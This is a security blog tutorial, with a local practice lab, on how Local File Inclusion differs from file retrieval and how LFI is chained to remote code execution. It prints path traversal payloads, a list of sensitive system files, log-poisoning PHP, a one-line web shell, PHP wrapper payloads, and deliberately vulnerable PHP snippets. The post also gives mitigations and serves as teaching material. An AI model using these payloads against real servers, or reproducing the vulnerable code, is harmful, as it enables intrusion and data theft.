---
title: "LFI vs. File Retrieval: How to Chain LFI into Remote Code Execution"
date: 2024-08-07 01:37:00 +0000
categories: [Web, LFI]
tags: [lfi, rce, file retrieval]    # TAG names should always be lowercase
description: An overview of the differences between Local File Inclusion (LFI) and file retrieval issues, including methods for chaining LFI vulnerabilities to achieve Remote Code Execution (RCE).
comments: true
image: /assets/img/posts/lfi/lfi.png
---

## Introduction

Alright, so thank you for your great response to my earlier post about [SSTI and Its Impact](https://dr34mhacks.github.io/posts/how-to-exploit-ssti/). Let's dive into another interesting topic: LFI. I know this might seem like the cherry on top, and most of you are probably already thinking of `(../)` in the back of your mind. Haha, wait—let's explore the areas where mistakes commonly occur. Not all `(../)` instances are LFI; some might be Directory Traversal, File Retrieval, or something else entirely.

So, when an interviewer asks you about a scenario where adding `(../etc/passwd)` to a file parameter allows them to view the content of passwd file, what vulnerability is that? Hold on before jumping to LFI as your answer. Give this article a full read, and you'll understand the differences. 

## Understanding Local File Inclusion (LFI)

Local File Inclusion (LFI) is a vulnerability that allows an attacker to trick a web application into including files on the server. This can lead to unauthorized access to sensitive information and, in some cases, even allow the execution of malicious code or in lovable language **RCE**.

Think of LFI as a way for attackers to say, "Let's see what's in your closet," where the closet is your server, and they didn't exactly knock before entering. Let me give an another good example: LFI is like the internet's version of sneaking into the neighbor's house to borrow sugar—without asking and often taking a whole lot more than just sugar. I guess you got the idea now. 

### How Does LFI Work?

LFI typically arises when a web application dynamically includes files based on user input **without properly validating** that input. This can happen in languages like PHP, where a common pattern might look like this:

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

In the above snippet it can be seen that the application accepts the user input in the `page` parameter and further uses the `include` function on user input, which is prone to LFI attacks. 

An attacker could craft a payload as below:

```bash
http://redacted.com/index.php?page=../../../../etc/passwd
```

In this example, the attacker is attempting to access the server's password file—a file you definitely don't want out in the wild. Awesome, let's figure out what is `Arbitrary File Retrieval`

- - - 

## What is Arbitrary File Retrieval?

Arbitrary File Retrieval is a type of security issue that occurs when an application allows users to access files on the server without proper authorization or validation. This vulnerability can lead to the disclosure of sensitive information, such as configuration files, `source code`, or even user data.

Think of it as finding a hidden treasure map in your attic, only to realize it wasn't meant for you to find and now everyone wants a piece of the treasure. 

### How Does Arbitrary File Retrieval Work?

Arbitrary File Retrieval typically arises from improper input validation or insufficient access controls. An attacker can exploit these weaknesses to access files outside the intended directory structure. Here's a simple example in PHP:

```php
<?php
$file = $_GET['file'];
readfile($file);
?>
```

In this scenario, an attacker could manipulate the `file` parameter to retrieve sensitive files:

```bash
http://redacted.com/download.php?file=../../../../etc/passwd
```

This attack leverages directory traversal to access the server's password file, revealing sensitive information.

## How File Retrieval is different from LFI? 

Got confused? In above examples both vulnerability allows access to `/etc/passwd` file now how you identify the actual root cause here? You could tell by checking their behaviour as both of these issues operate differently. LFI exploits occur when an application includes files from the server based on user input, allowing attackers to `inject paths` to access files indirectly, often by manipulating include or require statements in PHP. For example, an attacker might use a URL like `http://redacted.com/index.php?page=../../../../etc/passwd` to trick the server into including the sensitive file. 

On the other hand, File Retrieval vulnerabilities allow `direct access to files` by exploiting insufficient validation or access controls, often through directory traversal techniques. In this case, an attacker would use a URL such as `http://redacted.com/view.php?file=../../../../etc/passwd` to directly retrieve the file's contents. While both vulnerabilities can result in similar outcomes, LFI involves file inclusion logic, whereas File Retrieval focuses on direct file access through path manipulation.

Still Confused? Don't worry I will be giving you a quick tip here which allows you to answer an interviewer more confidently. 

> In an application, when you try to access a file like `download.php`, if the application is vulnerable to Local File Inclusion (LFI), it will actually execute  `download.php` within the application (in UI). However, if the application is vulnerable to File Retrieval, it will retrieve the content of `download.php` as plain text, resulting in source code disclosure. In short, LFI involves executing a file, while File Retrieval involves accessing and displaying the file's contents.
{: .prompt-tip }


## Let's do Practical

Again, I created a lab to demonstrate these issues. It's a quick lab called **Operation File Hunt**, available on [GitHub](https://github.com/dr34mhacks/operation-file-hunt).

If you have a Debian-based OS (e.g., Ubuntu or Kali):

```bash
git clone https://github.com/dr34mhacks/operation-file-hunt.git
cd operation-file-hunt
sudo bash runme.sh
```

![](/assets/img/posts/lfi/startlab.png)

This will start the lab on localhost with the path set to: `http://localhost:8085/`

![](/assets/img/posts/lfi/3.png)

### Arbitrary File Retrieval

Upon clicking the button on `Arbitrary File Retrieval` from the homepage, this will redirect you to an another page with the URL: `http://localhost:8085/arbitrary_file_retrieval.php`

![](/assets/img/posts/lfi/4.png)

To clarify any doubts, I retrieved the file (`/etc/passwd`) using file retrieval, as demonstrated in the screenshot below.

![file retrieval](/assets/img/posts/lfi/5.png)

Now comes the doubt-bursting part. The lab files contain a file named `safe.php` with simple PHP code (think of it as a backend source file for an application). We will try to retrieve this file.

![](/assets/img/posts/lfi/6.png)

I directly used the file name `safe.php` you could also use the absoulte path which is `<your-git-cloned-directory>/safe.php`. 

Here you can see that the application retrieved the actual file from the backend, which contains the raw PHP code. This is how file retrieval differs from LFI (Local File Inclusion). 

> Think of this lab as your client's application and try to dump the application's source code. In a real-world scenario, you would aim to dump all the application's source code files (specifically, the database connection file, configuration files, etc.), which could potentially lead to chaining other issues. This represents the highest impact of a file retrieval vulnerability.
{: .prompt-tip }

### Local File Inclusion

Since you understand the file retrieval issue, we will now move on to the LFI issue. Go to the homepage of our lab and click on `Local File Inclusion`. It will look like this:

![](/assets/img/posts/lfi/7.png)

Try to retrieve the files such as `/etc/passwd` and `/etc/hosts`. I mostly try to fetch the below sensitive files:

```bash
/etc/environment
/etc/group
/etc/gshadow
/etc/hostname
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/mysql/my.cnf
/etc/nginx/nginx.conf
/var/log/dpkg.log
/var/log/alternatives.log 
/etc/ssh/sshd_config
```

You can get the potential sensitive file list from here: [https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt)

These files are useful when the application has implemented blacklisting for keywords like `passwd` and `shadow`. Additionally, you could retrieve these files through an arbitrary file retrieval vulnerability as well.

Let’s see what happens when we try to fetch the application source code using an LFI issue. I will attempt to retrieve the same file, `safe.php`, but this time in an LFI scenario.

![](/assets/img/posts/lfi/8.png)

As shown in the screenshot, instead of retrieving the source code, LFI executes the source code, so you can't directly access the source code through an LFI issue. However, you can chain the LFI to retrieve the application source code if you find a way to execute system commands via remote code execution. I’ll demonstrate this further—keep reading and grab a coffee if you get bored.

Now, you might wonder about the difference between LFI and file retrieval if both can access server files. The answer lies in their `impact`. LFI can be further chained to achieve remote code execution, which goes beyond simply reading source code files and can have a much more severe impact on the server.

## LFI to RCE

Since there are numerous ways to chain an LFI issue to remote code execution (RCE), we will focus on some of the more reliable and relevant methods. These are `Injecting Code into Log Files` and `Using PHP Wrappers`. Let's go one by one. 

### Injecting Code into Log Files

Injecing code into log files widely known as **Log Poisoning** is a common technique used to gain a command injection from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log.

First we will try to locate our logs file, since we hosted our application via php server, which by default did not logs the access.log I created our application in a way where it logs the traffic entries in the folder `logs/access.log`. This provided the logs as follows:

![](/assets/img/posts/lfi/9.png)

> In a real-world application, try to identify the server in use (e.g., Apache, Nginx). This can be determined through error logs, the default server page, and response headers. For example, for an Apache server, the log file will be stored at `/var/log/apache2/error.log`, and for Nginx, it will be at `/var/log/nginx/access.log`.
{: .prompt-tip }

For log poisoning below php payload was included in the user-agent field, and when force browsing the `access.log` file again it actually executed the **id** command on the server. 

```php
<?php system('id');?>
```

![](/assets/img/posts/lfi/10.png)

You could also upload a simple PHP shell with the payload (`<?php system($_GET['cmd']); ?>`) below, which tells the server to use the `cmd` parameter to execute commands.

![](/assets/img/posts/lfi/11.png)

Executing the system commands:

![](/assets/img/posts/lfi/12.png)

#### Havn't you amazed, why this works?

I got you. Log poisoning works in this scenario because the server is logging user input (such as the User-Agent) directly into a log file without sanitization. When the server later includes or reads this log file through a `Local File Inclusion (LFI)` vulnerability, the malicious PHP code injected into the log file gets executed.

Here is how server logs the traffic in backend:

![](/assets/img/posts/lfi/logs.png)

>So, it should be clear that the command is not executed when it is inserted in the User-Agent value. As you can see, the logs are generated in plain text in the backend. The command is actually executed when the log file is accessed via the LFI vulnerability. I hope this is clear now. A question for you: What happens when you access this file through a file retrieval issue?
{: .prompt-info }


### Using PHP Wrappers

Let's move to our second well known exploit where we could utilise the php wrappers to execute the system commands. 

Some basic payloads to exfiltrate the file content in case of any direct blocking by the server:

```bash
php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
```

![](/assets/img/posts/lfi/13.png)

Bell ring!!!! 

>I know at this point you already understand how LFI and file retrieval work and what their differences are. You might say that LFI is more severe than file retrieval since it is not limited to source code retrieval and could potentially lead to command injection. However, it’s not always necessary to chain LFI with command injection to retrieve source code. Below is a sample payload where you can utilize the `data://` wrapper in PHP to view the actual source code in plain text:
{: .prompt-tip }

```bash
data://text/plain,<?php echo base64_encode(file_get_contents("safe.php")); ?>
```

![](/assets/img/posts/lfi/14.png)

**It's time for RCE again**

We will be utilising the `php://input` wrapper for this.

```bash
php://input <!---in vulnerable parameter--->
<?php system('id'); ?> <!---POST request body--->
```

![](/assets/img/posts/lfi/15.png)

Try to retrieve the flag from here. 

## Let's do a challenge now. 

Interesting reading so far—I hope you agree! Let’s try a quick LFI challenge; it should be super easy.

![](/assets/img/posts/lfi/16.png)

Hint - Try reading sauce... 😆

Share me the writeup (it should be very quick one) along with the payload used on [Linkedin](https://www.linkedin.com/in/sid-j0shi/) 

## How to mitigate these?

Below are the mitigations that should be followed:

#### For LFI:

- Ensure that user input is thoroughly validated and sanitized. Use allow-lists to restrict input to known, safe values.
- Prefer absolute paths over user-provided paths to minimize the risk of including unintended files. Avoid dynamically constructing file paths from user input.
- If dynamic path concatenation is necessary, restrict input to only acceptable characters, such as "a-zA-Z0-9". Avoid allowing potentially dangerous characters like `..`, `/`, `%00` (null byte), or any other unexpected symbols.
- Configure PHP to disable functions that can be used for LFI attacks, such as `include`, `require`, and `fopen`, if they are not needed.
- Implement secure coding practices to avoid vulnerabilities. For example, use `basename()` to sanitize filenames and ensure that the file inclusion is restricted to specific directories.

#### For File Retrieval

- Validate and sanitize all user inputs to ensure they meet expected formats.
- Use allowlists to restrict inputs to known, safe values, and deny access to potentially dangerous inputs.
- Once the input is validated, append it to a predefined base directory and utilize a filesystem API to resolve the canonical path. Confirm that this resolved path begins with the expected base directory.
- Ensure proper access controls are in place to restrict access to sensitive files and directories based on user roles and permissions.

## Final Conclude:

Local File Inclusion (LFI) and file retrieval vulnerabilities are not limited to PHP; they can occur in any programming language or web framework that handles file paths and includes files based on user input. These vulnerabilities arise when an application allows user-controlled input to dictate which files are accessed or included, potentially exposing sensitive information or enabling unauthorized access. While PHP's `include` and `require` functions are commonly associated with these issues, similar vulnerabilities can exist in other languages and frameworks. For instance, in Java, methods like `RequestDispatcher.include()` can be exploited if user inputs are not properly sanitized. In Python, functions like `open()` with user-controlled paths pose similar risks. Even in modern frameworks and languages that offer robust security mechanisms, improper handling of file paths can lead to LFI and file retrieval issues. Therefore, it is important to conduct comprehensive security test across all applications, regardless of the technology stack, to ensure that such vulnerabilities are identified and mitigated effectively.

Allright, off to holidays now and see you soon with the next article. 

![](/assets/img/posts/lfi/bye.jpg)

## References to follow:

- [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
- [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [https://www.youtube.com/watch?v=NWFl_1IRGTQ](https://www.youtube.com/watch?v=NWFl_1IRGTQ)
- [https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)